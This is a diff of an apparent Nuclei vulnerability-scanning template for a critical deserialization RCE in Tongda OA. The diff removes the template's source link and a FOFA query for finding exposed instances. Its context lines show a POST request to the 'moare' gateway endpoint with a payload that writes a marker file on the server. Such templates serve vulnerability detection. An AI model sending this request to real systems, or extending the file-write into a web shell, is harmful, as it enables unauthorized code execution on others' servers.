@@ -3,12 +3,8 @@ info:
   name: 通达OA moare 反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oi0e4dmg271ycn6v'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oi0e4dmg271ycn6v
-    fofa: app.name="通达 OA"
 http:
 - raw:
   - 'POST /general/appbuilder/web/portal/gateway/moare?a=1 HTTP/1.1
@@ -30,8 +26,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     img=file_put_contents("../../dudesuite.txt","dudesuite");
